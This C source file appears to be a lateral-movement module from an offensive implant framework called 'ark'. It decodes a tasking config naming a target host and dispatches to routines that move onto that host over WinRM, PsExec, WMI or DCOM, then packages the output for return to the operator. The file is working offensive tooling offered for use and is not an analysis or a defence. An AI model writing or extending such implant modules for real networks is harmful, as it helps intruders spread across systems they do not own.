#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <string.h>

#include "ark/lateral_impl.h"
#include "ark/modules.h"
#include "ark/pb_modules.h"

int ark_mod_lateral_move(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len) {
    ark_lateral_config cfg;
    if (!ark_pb_decode_lateral_config(config, config_len, &cfg)) return 0;

    if (!cfg.target[0]) {
        ark_pb_free_lateral_config(&cfg);
        return 0;
    }
    if (!cfg.method[0]) {
        snprintf(cfg.method, sizeof(cfg.method), "winrm");
    }

    int success = 0;
    char output[65536];
    output[0] = '\0';

    if (strcmp(cfg.method, "winrm") == 0) {
        ark_lateral_winrm(&cfg, output, sizeof(output), &success);
    } else if (strcmp(cfg.method, "psexec") == 0) {
        ark_lateral_psexec(&cfg, output, sizeof(output), &success);
    } else if (strcmp(cfg.method, "wmi") == 0) {
        ark_lateral_wmi(&cfg, output, sizeof(output), &success);
    } else if (strcmp(cfg.method, "dcom") == 0) {
        ark_lateral_dcom(&cfg, output, sizeof(output), &success);
    } else {
        snprintf(output, sizeof(output),
            "unknown lateral method '%s' (supported: winrm, psexec, wmi, dcom)", cfg.method);
        success = 0;
    }

    int ok = ark_pb_encode_lateral_result(cfg.method, cfg.target, success, output, out, out_len);
    ark_pb_free_lateral_config(&cfg);
    return ok;
}
